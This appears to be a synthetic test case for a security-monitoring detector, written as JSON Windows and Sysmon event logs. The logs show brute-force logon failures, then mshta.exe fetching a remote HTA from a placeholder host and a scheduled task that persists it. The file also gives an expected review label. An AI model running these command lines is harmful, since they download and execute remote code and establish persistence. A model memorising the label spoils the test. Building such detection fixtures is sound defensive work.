@@ -1,0 +1,234 @@
+{
+  "id": "D06",
+  "split": "dev",
+  "expected_review": false,
+  "variant": "different-session",
+  "rationale": "Valid different logon GUID",
+  "events": [
+    {
+      "timestamp": "2026-09-03T10:00:00Z",
+      "host": "WS-CHAIN-LAB",
+      "channel": "Security",
+      "provider": "Microsoft-Windows-Security-Auditing",
+      "event_id": 4625,
+      "record_id": 100,
+      "event_data": {
+        "TargetUserName": "analyst.lab",
+        "TargetDomainName": "LAB",
+        "IpAddress": "192.0.2.20",
+        "LogonType": "3",
+        "Status": "0xc000006d",
+        "SubStatus": "0xc000006a"
+      },
+      "provenance": {
+        "kind": "synthetic",
+        "generator": "soclab.corpus.sample_events; no commands executed"
+      }
+    },
+    {
+      "timestamp": "2026-09-03T10:00:01Z",
+      "host": "WS-CHAIN-LAB",
+      "channel": "Security",
+      "provider": "Microsoft-Windows-Security-Auditing",
+      "event_id": 4625,
+      "record_id": 101,
+      "event_data": {
+        "TargetUserName": "analyst.lab",
+        "TargetDomainName": "LAB",
+        "IpAddress": "192.0.2.20",
+        "LogonType": "3",
+        "Status": "0xc000006d",
+        "SubStatus": "0xc000006a"
+      },
+      "provenance": {
+        "kind": "synthetic",
+        "generator": "soclab.corpus.sample_events; no commands executed"
+      }
+    },
+    {
+      "timestamp": "2026-09-03T10:00:02Z",
+      "host": "WS-CHAIN-LAB",
+      "channel": "Security",
+      "provider": "Microsoft-Windows-Security-Auditing",
+      "event_id": 4625,
+      "record_id": 102,
+      "event_data": {
+        "TargetUserName": "analyst.lab",
+        "TargetDomainName": "LAB",
+        "IpAddress": "192.0.2.20",
+        "LogonType": "3",
+        "Status": "0xc000006d",
+        "SubStatus": "0xc000006a"
+      },
+      "provenance": {
+        "kind": "synthetic",
+        "generator": "soclab.corpus.sample_events; no commands executed"
+      }
+    },
+    {
+      "timestamp": "2026-09-03T10:00:03Z",
+      "host": "WS-CHAIN-LAB",
+      "channel": "Security",
+      "provider": "Microsoft-Windows-Security-Auditing",
+      "event_id": 4625,
+      "record_id": 103,
+      "event_data": {
+        "TargetUserName": "analyst.lab",
+        "TargetDomainName": "LAB",
+        "IpAddress": "192.0.2.20",
+        "LogonType": "3",
+        "Status": "0xc000006d",
+        "SubStatus": "0xc000006a"
+      },
+      "provenance": {
+        "kind": "synthetic",
+        "generator": "soclab.corpus.sample_events; no commands executed"
+      }
+    },
+    {
+      "timestamp": "2026-09-03T10:00:04Z",
+      "host": "WS-CHAIN-LAB",
+      "channel": "Security",
+      "provider": "Microsoft-Windows-Security-Auditing",
+      "event_id": 4625,
+      "record_id": 104,
+      "event_data": {
+        "TargetUserName": "analyst.lab",
+        "TargetDomainName": "LAB",
+        "IpAddress": "192.0.2.20",
+        "LogonType": "3",
+        "Status": "0xc000006d",
+        "SubStatus": "0xc000006a"
+      },
+      "provenance": {
+        "kind": "synthetic",
+        "generator": "soclab.corpus.sample_events; no commands executed"
+      }
+    },
+    {
+      "timestamp": "2026-09-03T10:00:05Z",
+      "host": "WS-CHAIN-LAB",
+      "channel": "Security",
+      "provider": "Microsoft-Windows-Security-Auditing",
+      "event_id": 4624,
+      "record_id": 105,
+      "event_data": {
+        "TargetUserName": "analyst.lab",
+        "TargetDomainName": "LAB",
+        "IpAddress": "192.0.2.20",
+        "LogonType": "3",
+        "LogonGuid": "{9e175872-74a3-5c6d-882c-524c742cb7dc}",
+        "TargetLogonId": "0x42"
+      },
+      "provenance": {
+        "kind": "synthetic",
+        "generator": "soclab.corpus.sample_events; no commands executed"
+      }
+    },
+    {
+      "timestamp": "2026-09-03T10:00:06Z",
+      "host": "WS-CHAIN-LAB",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "provider": "Microsoft-Windows-Sysmon",
+      "event_id": 1,
+      "record_id": 106,
+      "event_data": {
+        "User": "LAB\\analyst.lab",
+        "LogonGuid": "{11111111-1111-1111-1111-111111111111}",
+        "LogonId": "0x42",
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta",
+        "ProcessGuid": "{ac333bb9-aa2e-5082-938a-2c0dee8262a1}",
+        "ParentProcessGuid": "{00000000-0000-0000-0000-000000000000}",
+        "ProcessId": "4000"
+      },
+      "provenance": {
+        "kind": "synthetic",
+        "generator": "soclab.corpus.sample_events; no commands executed"
+      }
+    },
+    {
+      "timestamp": "2026-09-03T10:00:07Z",
+      "host": "WS-CHAIN-LAB",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "provider": "Microsoft-Windows-Sysmon",
+      "event_id": 1,
+      "record_id": 107,
+      "event_data": {
+        "User": "LAB\\analyst.lab",
+        "LogonGuid": "{11111111-1111-1111-1111-111111111111}",
+        "LogonId": "0x42",
+        "Image": "C:\\Windows\\System32\\mshta.exe",
+        "CommandLine": "mshta.exe https://payload.example.invalid/stage.hta",
+        "ProcessGuid": "{f778258b-2409-596c-9c79-f0ab1770249d}",
+        "ParentProcessGuid": "{ac333bb9-aa2e-5082-938a-2c0dee8262a1}",
+        "ProcessId": "4001"
+      },
+      "provenance": {
+        "kind": "synthetic",
+        "generator": "soclab.corpus.sample_events; no commands executed"
+      }
+    },
+    {
+      "timestamp": "2026-09-03T10:00:08Z",
+      "host": "WS-CHAIN-LAB",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "provider": "Microsoft-Windows-Sysmon",
+      "event_id": 3,
+      "record_id": 108,
+      "event_data": {
+        "Image": "C:\\Windows\\System32\\mshta.exe",
+        "ProcessGuid": "{f778258b-2409-596c-9c79-f0ab1770249d}",
+        "DestinationIp": "198.51.100.20",
+        "DestinationPort": "443",
+        "Initiated": "true",
+        "Protocol": "tcp"
+      },
+      "provenance": {
+        "kind": "synthetic",
+        "generator": "soclab.corpus.sample_events; no commands executed"
+      }
+    },
+    {
+      "timestamp": "2026-09-03T10:00:09Z",
+      "host": "WS-CHAIN-LAB",
+      "channel": "Microsoft-Windows-Sysmon/Operational",
+      "provider": "Microsoft-Windows-Sysmon",
+      "event_id": 1,
+      "record_id": 109,
+      "event_data": {
+        "User": "LAB\\analyst.lab",
+        "LogonGuid": "{11111111-1111-1111-1111-111111111111}",
+        "LogonId": "0x42",
+        "Image": "C:\\Windows\\System32\\schtasks.exe",
+        "CommandLine": "schtasks.exe /Create /SC ONLOGON /TN LabUpdater /TR \"mshta.exe https://payload.example.invalid/stage.hta\"",
+        "ProcessGuid": "{582945ac-4be3-5081-ab8d-39ed62d01823}",
+        "ParentProcessGuid": "{f778258b-2409-596c-9c79-f0ab1770249d}",
+        "ProcessId": "4002"
+      },
+      "provenance": {
+        "kind": "synthetic",
+        "generator": "soclab.corpus.sample_events; no commands executed"
+      }
+    },
+    {
+      "timestamp": "2026-09-03T10:00:10Z",
+      "host": "WS-CHAIN-LAB",
+      "channel": "Security",
+      "provider": "Microsoft-Windows-Security-Auditing",
+      "event_id": 4698,
+      "record_id": 110,
+      "event_data": {
+        "SubjectUserName": "analyst.lab",
+        "SubjectDomainName": "LAB",
+        "SubjectLogonId": "0x42",
+        "TaskName": "\\LabUpdater",
+        "TaskContent": "<Task><Actions><Exec><Command>mshta.exe</Command></Exec></Actions></Task>"
+      },
+      "provenance": {
+        "kind": "synthetic",
+        "generator": "soclab.corpus.sample_events; no commands executed"
+      }
+    }
+  ]
+}
